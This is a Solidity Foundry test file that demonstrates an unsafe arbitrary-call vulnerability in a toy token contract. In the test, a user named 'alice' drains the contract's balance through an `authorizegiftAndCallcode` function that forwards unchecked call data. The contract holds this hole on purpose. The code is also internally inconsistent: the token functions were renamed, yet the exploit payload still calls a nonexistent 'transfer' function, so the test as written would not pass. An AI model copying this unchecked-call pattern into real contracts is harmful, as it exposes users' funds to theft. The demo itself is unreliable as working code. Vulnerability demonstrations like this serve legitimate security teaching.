// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    InfluencetokenWhale InfluencetokenWhaleContract;

    function testAltCall() public {
        address alice = vm.addr(1);
        InfluencetokenWhaleContract = new InfluencetokenWhale();
        InfluencetokenWhaleContract.KarmatokenWhaleDeploy(address(InfluencetokenWhaleContract));
        console.log(
            "TokenWhale balance:",
            InfluencetokenWhaleContract.influenceOf(address(InfluencetokenWhaleContract))
        );

        // bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000);

        console.log(
            "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
        );
        vm.prank(alice);
        InfluencetokenWhaleContract.authorizegiftAndCallcode(
            address(InfluencetokenWhaleContract),
            0x1337,
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                address(alice),
                1000
            )
        );

        assertEq(InfluencetokenWhaleContract.influenceOf(address(alice)), 1000);
        console.log("operate completed");
        console.log(
            "TokenWhale balance:",
            InfluencetokenWhaleContract.influenceOf(address(InfluencetokenWhaleContract))
        );
        console.log(
            "Alice balance:",
            InfluencetokenWhaleContract.influenceOf(address(alice))
        );
    }

    receive() external payable {}
}

contract InfluencetokenWhale {
    address player;

    uint256 public pooledInfluence;
    mapping(address => uint256) public influenceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function KarmatokenWhaleDeploy(address _player) public {
        player = _player;
        pooledInfluence = 1000;
        influenceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return influenceOf[player] >= 1000000; // 1 mil
    }

    event GiveCredit(address indexed from, address indexed to, uint256 value);

    function _sharekarma(address to, uint256 value) internal {
        influenceOf[msg.sender] -= value;
        influenceOf[to] += value;

        emit GiveCredit(msg.sender, to, value);
    }

    function sendTip(address to, uint256 value) public {
        require(influenceOf[msg.sender] >= value);
        require(influenceOf[to] + value >= influenceOf[to]);

        _sharekarma(to, value);
    }

    event Approval(
        address indexed moderator,
        address indexed spender,
        uint256 value
    );

    function authorizeGift(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function sendtipFrom(address from, address to, uint256 value) public {
        require(influenceOf[from] >= value);
        require(influenceOf[to] + value >= influenceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _sharekarma(to, value);
    }

    /* Approves and then calls the contract code*/

    function authorizegiftAndCallcode(
        address _spender,
        uint256 _value,
        bytes memory _extraData
    ) public {
        allowance[msg.sender][_spender] = _value;

        bool success;

        (success, ) = _spender.call(_extraData);
        console.log("success:", success);
    }
}
